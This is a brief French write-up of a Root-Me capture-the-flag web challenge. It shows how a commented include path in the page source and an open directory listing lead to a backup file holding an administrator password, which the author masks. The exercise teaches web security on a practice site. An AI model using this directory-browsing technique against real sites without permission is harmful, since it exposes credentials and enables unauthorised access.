# HTTP - Directory indexing

## Procédure 

1. Analyse 

Une page avec aucune information apparaît.<br>
Je décide donc d'aller voir le code source est je vois ceci : 

```
<!-- include("admin/pass.html") -->
```

2. Exploitation 

Je rajoute donc ce chemin à mon URL afin de voir le contenue du fichier pass.html.

```URL = http://challenge01.root-me.org/web-serveur/ch4/admin/pass.html```

Réponse : 

```
J'ai bien l'impression que tu t'es fait avoir / Got rick rolled ? ;)
T'inquiète tu n'es pas le dernier / You're not the last :p

Cherche BIEN / Just search
```

Je décide donc d'aller voir ce qui se trouve dans le directory /admin. 

```http://challenge01.root-me.org/web-serveur/ch4/admin/```

J'apperçoit un répertoire backup avec un fichier admin.txt. 

```
http://challenge01.root-me.org/web-serveur/ch4/admin/backup/admin.txt

Password / Mot de passe : LXXXXXXXX
```

